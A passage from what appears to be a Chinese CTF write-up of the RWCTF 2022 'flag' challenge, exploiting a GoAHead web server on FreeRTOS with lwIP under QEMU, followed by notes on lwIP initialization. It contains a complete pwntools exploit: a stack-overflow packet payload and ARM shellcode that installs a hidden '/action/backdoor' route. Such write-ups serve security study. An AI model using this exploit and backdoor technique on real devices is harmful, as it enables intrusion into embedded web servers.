class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Load route and authentication configuration files</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">PUBLIC <span class="keyword">int</span> <span class="title">websLoad</span><span class="params">(cchar *path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> (line = stok(buf, <span class="string">"\r\n"</span>, &amp;token); line; line = stok(<span class="literal">NULL</span>, <span class="string">"\r\n"</span>, &amp;token)) &#123;</span><br><span class="line">        kind = stok(line, <span class="string">" \t"</span>, &amp;next);</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (smatch(kind, <span class="string">"route"</span>)) &#123;</span><br><span class="line">            auth = dir = handler = protocol = uri = <span class="number">0</span>;</span><br><span class="line">            abilities = extensions = methods = redirects = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">while</span> ((option = stok(<span class="literal">NULL</span>, <span class="string">" \t\r\n"</span>, &amp;next)) != <span class="number">0</span>) &#123;</span><br><span class="line">                key = stok(option, <span class="string">"="</span>, &amp;value);</span><br><span class="line">                <span class="keyword">if</span> ...</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (smatch(key, <span class="string">"handler"</span>)) &#123;</span><br><span class="line">                    handler = value;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (smatch(key, <span class="string">"methods"</span>)) &#123;</span><br><span class="line">                    addOption(&amp;methods, value, <span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (smatch(key, <span class="string">"redirect"</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">strchr</span>(value, <span class="string">'@'</span>)) &#123;</span><br><span class="line">                        status = stok(value, <span class="string">"@"</span>, &amp;redirectUri);</span><br><span class="line">                        <span class="keyword">if</span> (smatch(status, <span class="string">"*"</span>)) &#123;</span><br><span class="line">                            status = <span class="string">"0"</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        status = <span class="string">"0"</span>;</span><br><span class="line">                        redirectUri = value;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ...</span><br><span class="line">                &#125; ...</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (smatch(key, <span class="string">"uri"</span>)) &#123;</span><br><span class="line">                    uri = value;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    error(<span class="string">"Bad route keyword %s"</span>, key);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((route = websAddRoute(uri, handler, <span class="number">-1</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">                rc = <span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            websSetRouteMatch(route, dir, protocol, methods, extensions, abilities, redirects);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ME_GOAHEAD_AUTH</span></span><br><span class="line">            <span class="keyword">if</span> (auth &amp;&amp; websSetRouteAuth(route, auth) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                rc = <span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通读源码可以看到，我们只需执行 <code>websAddRoute(&quot;/action/backdoor&quot;, &quot;action&quot;, 0)</code> ，即可成功将 backdoor 路由注册进路由表中。而且还可以指定第三个参数，将 backdoor 路由放置进路由表的最前端。</p>
<p>默认情况下 route 的其他字段为 -1，因此 route 中的 dir、protocol、methods 等不会参与路由匹配。所以下面那个 <code>websSetRouteMatch</code> 函数我们可以不用手动执行。</p>
</li>
</ul>
<h3 id="d-遇到的其他坑点">d. 遇到的其他坑点</h3>
<p>继续写 exp 时遇到了一些问题：</p>
<ul>
<li>
<p>submit 的 shellcode 会被 GoAHead 进行 URL 编码：</p>
<p><img src="/2022/01/rwctf2022_flag/image-20220130113744939.png" alt="image-20220130113744939"></p>
<p>因此在发送 submit 请求时，需要加上 HTTP header 显式告知 GoAHead 无需编码：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"Content-Type":"application/x-www-form-urlencoded"</span><br></pre></td></tr></table></figure>
<p>需要注意的是，既然都标上这个了，发送的 data 就<strong>不能是 json</strong> 了（即不能发送 <code>{'word': shellcode}</code>），因为这还是会让远程忽略该 header 进行 URL 编码。</p>
</li>
<li>
<p>pwntools 编码 shellcode 时报错：<code>pwnlib.exception.PwnlibException: Could not find 'as' installed for ContextType(arch = 'arm', bits = 32, encoding = 'latin', endian = 'little', log_level = 10, os = 'linux')</code></p>
<p>这是因为我的机器上没有安装 ARM 编译相关的环境等等，执行以下命令安装即可：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install binutils-arm-linux-gnueabi</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>gdb pwndbg 中， <code>p/x $fp</code> 显示的是 <code>$sp</code> 的值，但实际上 <code>$fp</code> 和 <code>$r11</code> 是同一个寄存器，有点奇怪，可能是 gdb bug。</p>
</li>
<li>
<p>若出现以下情况，则需要<strong>重启 linux（重启 qemu 已经没用了）</strong>，或者直接进 docker 中调试：</p>
<ul>
<li>
<p>gdb find 出来的 <strong>shellcode 地址不固定</strong></p>
</li>
<li>
<p><strong>每次</strong>执行时栈溢出所在栈上数据，有<strong>好几个指针的值</strong>每次都不同</p>
<blockquote>
<p>根据本人调试，<strong>每次</strong>栈上数据最多只会有<strong>一个非指针值</strong>发生改变，并且不影响程序执行。</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h3 id="e-本地-exploit">e. 本地 exploit</h3>
<blockquote>
<p>没试过远程，因为远程关了…</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">context(</span><br><span class="line">    arch=<span class="string">'arm'</span>,</span><br><span class="line">    bits=<span class="number">32</span>,</span><br><span class="line">    encoding=<span class="string">'latin'</span>,</span><br><span class="line">    log_level=<span class="string">"info"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">baseURL = <span class="string">"http://localhost:5555"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_session</span><span class="params">()</span>:</span></span><br><span class="line">    session = requests.session()</span><br><span class="line">    login_data = &#123;<span class="string">"username"</span>: <span class="string">"admin"</span>, <span class="string">"password"</span>: <span class="string">"admin"</span>&#125;</span><br><span class="line">    res = session.post(url=baseURL+<span class="string">"/action/login"</span>, data=login_data)</span><br><span class="line">    <span class="keyword">assert</span> res.status_code == <span class="number">200</span></span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit_msg</span><span class="params">(session, msg)</span>:</span></span><br><span class="line">    <span class="comment"># submit_data = msg # &#123;"word": msg&#125;</span></span><br><span class="line">    </span><br><span class="line">    res = session.post(</span><br><span class="line">        url=baseURL+<span class="string">"/action/submit"</span>, </span><br><span class="line">        headers=&#123; <span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span> &#125;,</span><br><span class="line">        data=msg)</span><br><span class="line">    <span class="keyword">assert</span> res.status_code == <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def get_last_submit_msg(session):</span></span><br><span class="line"><span class="comment">#     res = session.get(url=baseURL+"/submit.jst")</span></span><br><span class="line"><span class="comment">#     assert res.status_code == 200</span></span><br><span class="line"><span class="comment">#     return res.content</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_shellcode</span><span class="params">(shellcode_addr=<span class="number">0x6004cb30</span>)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_packet</span><span class="params">(packet_len, data=<span class="string">b''</span>)</span>:</span></span><br><span class="line">        p = remote(<span class="string">"127.0.0.1"</span>, <span class="number">5555</span>)</span><br><span class="line">        remain_len = packet_len - len(data)</span><br><span class="line">        <span class="keyword">assert</span> remain_len &gt;= <span class="number">0</span></span><br><span class="line">        p.send(data + <span class="string">b"*"</span> * remain_len)</span><br><span class="line">        p.close()</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="string">"backdoor"</span>: <span class="comment"># \x62 \x61 \x63 \x6b \x64 \x6f \x6f \x72</span></span><br><span class="line">        send_packet(ord(ch) - <span class="number">0x3a</span>)</span><br><span class="line">    send_packet(<span class="number">0x202</span> - <span class="number">0x3a</span>, flat(</span><br><span class="line">        <span class="string">"-"</span>*<span class="number">0xa</span>,</span><br><span class="line">        <span class="number">0x6b636162</span>,      <span class="number">0x726f6f64</span>,      <span class="number">0x60e4297c</span>,      <span class="number">0x00000202</span>,</span><br><span class="line">        <span class="number">0x02020000</span>,      <span class="number">0x609a4208</span>,      <span class="number">0x61cd29f8</span>,      <span class="number">0xffffffff</span>,</span><br><span class="line">        <span class="number">0x61cd27e4</span>,      <span class="number">0x60e52d58</span>,      <span class="number">0x04040404</span>,      <span class="number">0x60e429d4</span>,</span><br><span class="line">        shellcode_addr,  <span class="number">0x06060606</span>,      <span class="number">0x00000000</span>,      <span class="number">0x08080808</span>,</span><br><span class="line">        <span class="number">0x609a4208</span>,      <span class="number">0x61cd278c</span>,      <span class="number">0x6000001f</span>,      <span class="number">0x00000001</span>,</span><br><span class="line">        <span class="number">0x2000001f</span>,      <span class="number">0x11111111</span>,      <span class="number">0x00000000</span>,      <span class="number">0x00000000</span>,</span><br><span class="line">        <span class="number">0x00000000</span>,      <span class="number">0x00000000</span>,      <span class="number">0x00000000</span>,      <span class="number">0x00000000</span>,</span><br><span class="line">        <span class="number">0x80000068</span>,      <span class="number">0x60e428e8</span>,      <span class="number">0x00000000</span>,      <span class="number">0x60e52cf4</span>,</span><br><span class="line">        <span class="number">0x609a40e4</span>,      <span class="number">0x60e429f0</span>,      <span class="number">0x609a40dc</span>,      <span class="number">0x00000001</span>,</span><br><span class="line">        <span class="number">0x60e3a994</span>,      <span class="number">0x60e3a994</span>,      <span class="number">0x60e429f0</span>,      <span class="number">0x00000000</span>,</span><br><span class="line">        <span class="number">0x00000006</span>,      <span class="number">0x60e3a9e8</span>,      <span class="number">0x00787265</span>,      <span class="number">0x00000000</span>,</span><br><span class="line">        <span class="number">0x00000000</span>,      <span class="number">0x00000005</span>,      <span class="number">0x00000000</span>,      <span class="number">0x00000006</span>,</span><br><span class="line">        <span class="number">0x00000000</span>,      <span class="number">0x0000007e</span>,      <span class="number">0x00000000</span>,      <span class="number">0x00000000</span>,</span><br><span class="line">        <span class="number">0x00000000</span>,      <span class="number">0x00000000</span>,      <span class="number">0x80000080</span>,      <span class="number">0x60e42aac</span>,</span><br><span class="line">        <span class="number">0x60e42ac0</span>,      <span class="number">0x60e42acc</span>,      <span class="number">0x60e42abc</span>,      <span class="number">0x00000000</span>,</span><br><span class="line">        <span class="number">0x60e42a70</span>,      <span class="number">0xffffffff</span>,      <span class="number">0x60e42a70</span>,      <span class="number">0x60e42a70</span>,</span><br><span class="line">        <span class="number">0x00000001</span>,      <span class="number">0x60e42a84</span>,      <span class="number">0xffffffff</span>,      <span class="number">0x60e4aaf8</span>,</span><br><span class="line">        <span class="number">0x60e4aaf8</span>,      <span class="number">0x00000000</span>,      <span class="number">0x00000008</span>,      <span class="number">0x00000004</span>,</span><br><span class="line">        <span class="number">0x0000ffff</span>,      <span class="number">0x00000000</span>,      <span class="number">0x00000000</span>,      <span class="number">0x00000000</span>,</span><br><span class="line">        <span class="number">0x60e52bc4</span>,      <span class="number">0x60e52a9c</span>,      <span class="number">0x60e52ab4</span>,      <span class="number">0x60e72954</span>,</span><br><span class="line">        <span class="number">0x60e52a9c</span>,      <span class="number">0x60e52a9c</span>,      <span class="number">0x60e52ab4</span>,      <span class="number">0x60e72954</span>,</span><br><span class="line">        <span class="number">0x00000000</span>,      <span class="number">0x00000000</span>,      <span class="number">0x80008008</span>,      <span class="number">0xa5a5a5a5</span>,</span><br><span class="line">        <span class="number">0xa5a5a5a5</span>,      <span class="number">0xa5a5a5a5</span>,      <span class="number">0xa5a5a5a5</span>,      <span class="number">0xa5a5a5a5</span>,</span><br><span class="line">        <span class="number">0xa5a5a5a5</span>,      <span class="number">0xa5a5a5a5</span>,      <span class="number">0xa5a5a5a5</span>,      <span class="number">0xa5a5a5a5</span>,</span><br><span class="line">        <span class="number">0xa5a5a5a5</span>,      <span class="number">0xa5a5a5a5</span>,      <span class="number">0xa5a5a5a5</span>,      <span class="number">0xa5a5a5a5</span>,</span><br><span class="line">        <span class="number">0xa5a5a5a5</span>,      <span class="number">0xa5a5a5a5</span>,      <span class="number">0xa5a5a5a5</span>,      <span class="number">0xa5a5a5a5</span>,</span><br><span class="line">        <span class="number">0xa5a5a5a5</span>,      <span class="number">0xa5a5a5a5</span>,      <span class="number">0xa5a5a5a5</span>,      <span class="number">0xa5a5a5a5</span>,</span><br><span class="line">        <span class="number">0xa5a5a5a5</span>,      <span class="number">0xa5a5a5a5</span>,      <span class="number">0xa5a5a5a5</span>,      <span class="string">"\xa5\xa5"</span>,</span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line">shellcode_addr = <span class="number">0x60d9c588</span></span><br><span class="line">sc_bytecode = asm(vma=shellcode_addr, shellcode=<span class="string">'''</span></span><br><span class="line"><span class="string">    // save all registers</span></span><br><span class="line"><span class="string">    push &#123;r0-r11&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // memcpy handler to /log_err.html + 0x200</span></span><br><span class="line"><span class="string">    ldr r0, =0x606D3aD0 </span></span><br><span class="line"><span class="string">    ldr r1, =backdoor_handler </span></span><br><span class="line"><span class="string">    ldr r2, =0x200         </span></span><br><span class="line"><span class="string">    ldr r3, =0x60021704 </span></span><br><span class="line"><span class="string">    BL call</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // call websDefineAction("backdoor", backdoor_handler)</span></span><br><span class="line"><span class="string">    ldr r0, =backdoor     </span></span><br><span class="line"><span class="string">    ldr r1, =0x606D3aD0   </span></span><br><span class="line"><span class="string">    ldr r3, =0x6004D28C   </span></span><br><span class="line"><span class="string">    BL call</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // rt_printf status</span></span><br><span class="line"><span class="string">    mov r1, r0</span></span><br><span class="line"><span class="string">    ldr r0, =rt_printf_fmt</span></span><br><span class="line"><span class="string">    ldr r3, =0x6002111C</span></span><br><span class="line"><span class="string">    BL call</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // websAddRoute("/action/backdoor", "action", 0)</span></span><br><span class="line"><span class="string">    ldr r0, =route_path</span></span><br><span class="line"><span class="string">    ldr r1, =route_handler</span></span><br><span class="line"><span class="string">    mov r2, 0</span></span><br><span class="line"><span class="string">    ldr r3, =0x600636A0</span></span><br><span class="line"><span class="string">    BL call</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // pop all registers</span></span><br><span class="line"><span class="string">    pop &#123;r0-r11&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // return to origin</span></span><br><span class="line"><span class="string">    ldr pc, =0x6004cb30</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* ----------- backdoor_handler ----------- */</span></span><br><span class="line"><span class="string">backdoor_handler:</span></span><br><span class="line"><span class="string">    push &#123;r1-r11, lr&#125;</span></span><br><span class="line"><span class="string">    push &#123;r0&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // char* name = websGetVar(wp, key, key);</span></span><br><span class="line"><span class="string">    ldr r0, [sp]</span></span><br><span class="line"><span class="string">    ldr r1, =flag</span></span><br><span class="line"><span class="string">    ldr r2, =flag</span></span><br><span class="line"><span class="string">    ldr r3, =0x600577C4</span></span><br><span class="line"><span class="string">    BL call</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // memcpy to 404 data</span></span><br><span class="line"><span class="string">    mov r1, r0</span></span><br><span class="line"><span class="string">    ldr r0, =0x60076824</span></span><br><span class="line"><span class="string">    // ldr r1, =success_page  </span></span><br><span class="line"><span class="string">    ldr r2, =23          </span></span><br><span class="line"><span class="string">    ldr r3, =0x60021704</span></span><br><span class="line"><span class="string">    BL call</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // websSetStatus(wp, 200)</span></span><br><span class="line"><span class="string">    ldr r0, [sp]</span></span><br><span class="line"><span class="string">    ldr r1, =200</span></span><br><span class="line"><span class="string">    ldr r3, =0x600588C4</span></span><br><span class="line"><span class="string">    BL call</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // websWriteHeaders(wp, -1, 0)</span></span><br><span class="line"><span class="string">    ldr r0, [sp]</span></span><br><span class="line"><span class="string">    ldr r1, =-1</span></span><br><span class="line"><span class="string">    ldr r2, =0</span></span><br><span class="line"><span class="string">    ldr r3, =0x6005891C</span></span><br><span class="line"><span class="string">    BL call</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // websWriteEndHeaders(wp)</span></span><br><span class="line"><span class="string">    ldr r0, [sp]</span></span><br><span class="line"><span class="string">    ldr r3, =0x60058D30</span></span><br><span class="line"><span class="string">    BL call</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // websWrite(wp, page)</span></span><br><span class="line"><span class="string">    ldr r0, [sp]</span></span><br><span class="line"><span class="string">    ldr r1, =success_page</span></span><br><span class="line"><span class="string">    ldr r3, =0x60058E2C</span></span><br><span class="line"><span class="string">    BL call</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // websDone(wp)</span></span><br><span class="line"><span class="string">    ldr r0, [sp]</span></span><br><span class="line"><span class="string">    ldr r3, =0x6005496C</span></span><br><span class="line"><span class="string">    BL call</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    pop &#123;r0&#125;</span></span><br><span class="line"><span class="string">    pop &#123;r1-r11, pc&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">call: // 手动实现 call r3</span></span><br><span class="line"><span class="string">    push &#123;lr&#125;</span></span><br><span class="line"><span class="string">    mov lr, pc</span></span><br><span class="line"><span class="string">    add lr, lr, 4</span></span><br><span class="line"><span class="string">    mov pc, r3 </span></span><br><span class="line"><span class="string">    pop &#123;pc&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag:           .asciz  "flag"</span></span><br><span class="line"><span class="string">backdoor:       .asciz  "backdoor"</span></span><br><span class="line"><span class="string">success_page:   .asciz  "&#123;\\"status\\" : \\"success\\"&#125;"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">route_path:     .asciz  "/action/backdoor"</span></span><br><span class="line"><span class="string">route_handler:  .asciz  "action"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rt_printf_fmt:  .asciz  "shellcode status: %d\\n"</span></span><br><span class="line"><span class="string">backdoor_fmt:   .asciz  "backdoor: %s\\n"</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">    <span class="comment"># 启动 qemu</span></span><br><span class="line">    p = process(<span class="string">"./dbg.sh"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"lwIP-2.1.3 initialized!"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送并执行 shellcode</span></span><br><span class="line">    log.info(<span class="string">"exploiting..."</span>)</span><br><span class="line">    session = create_session()</span><br><span class="line">    submit_msg(session, <span class="string">b"ShellcodeHeader"</span> + sc_bytecode)</span><br><span class="line">    execute_shellcode(shellcode_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 手动进行 health check，并获取 flag</span></span><br><span class="line">    <span class="comment"># print(p.recvall(timeout=1))</span></span><br><span class="line">    <span class="comment"># os.system("python3 ./flag.py")</span></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
<p>效果：</p>
<p><img src="/2022/01/rwctf2022_flag/image-20220131114450939.png" alt="image-20220131114450939"></p>
<h2 id="七、RT-thread-–-lwIP">七、RT-thread – lwIP</h2>
<p>这题的题解如上文所示，到此为止。接下来我们来简单扩展一下内容。</p>
<h3 id="a-Overview">a. Overview</h3>
<p>这一题 FreeRTOS 中的 lwIP 协议栈模块，是使用的 RT-thread （国产 RTOS）中的 lwIP 。</p>
<blockquote>
<p>根据出题人的想法，使用 RT-thread 中的 lwIP 是为了便于调试。</p>
<p>出题也不容易…</p>
</blockquote>
<p>lwIP 是一个小型开源的 TCP/IP 协议栈，重点是在保持 TCP 主要功能的基础上减少对 RAM 的占用，适合嵌入式系统。RT-thread 中，协议栈的驱动架构图如下：</p>
<p><img src="/2022/01/rwctf2022_flag/an010_lwip_block.png" alt="驱动架构图"></p>
<p>RT-thread 在原版 lwIP 的基础上，新增了一个网络设备层。该层对以太网数据收发采用<strong>独立双线程结构</strong>。</p>
<p><img src="/2022/01/rwctf2022_flag/an010_rt_xxx_eth_rx.png" alt="数据接收流程"></p>
<p>当以太网硬件接收到数据报文后，硬件会将数据放入缓冲区，之后触发硬件中断。所注册的中断处理例程会发送邮件（mail）通知数据接收线程 erx ，使其根据报文长度申请 pbuf、读入数据，并在数据接收完成后，继续发送邮件唤醒 TCP/IP 线程进行进一步的处理。</p>
<p><img src="/2022/01/rwctf2022_flag/etx.png" alt="数据发送流程"></p>
<p>当有数据需要发送时，lwIP 会通过邮件向 etx 线程发送请求，之后永久等待 tx_ack 信号量，等待数据发送完成。而当 ext 线程数据发送完成后， tx_ack 信号量将会被设置，通知 lwIP 数据已经发送完成。</p>
<p>接下来，我们来简单看看这个数据收发的过程。</p>
<h3 id="b-lwip-init">b. lwip_init</h3>
<p>初始时，RTOS 中控制流会执行 <code>lwip_system_init</code> 函数来进行一系列的初始化操作。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * LwIP system initialization</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">eth_system_device_init_private</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lwip_system_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    eth_system_device_init_private();</span><br><span class="line">    ...</span><br><span class="line">    tcpip_init(tcpip_init_done_callback, (<span class="keyword">void</span> *)&amp;done_sem);</span><br><span class="line">    ...</span><br><span class="line">    rt_kprintf(<span class="string">"lwIP-%d.%d.%d initialized!\n"</span>, LWIP_VERSION_MAJOR, LWIP_VERSION_MINOR, LWIP_VERSION_REVISION);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数：</p>
<ul>
<li>执行 <code>eth_system_device_init_private</code> 初始化 erx 和 etx 线程。</li>
<li>调用 <code>tcpip_init</code> 创建 tcpip 线程。</li>
<li>输出回显信息。可以看到这里输出的信息和题目输出的是一样的。</li>
</ul>
<p>这里我们只关注 <code>eth_system_device_init_private</code> 函数，该函数只做了两件事：创建 etx 和 erx 线程，并创建对应的邮箱。</p>
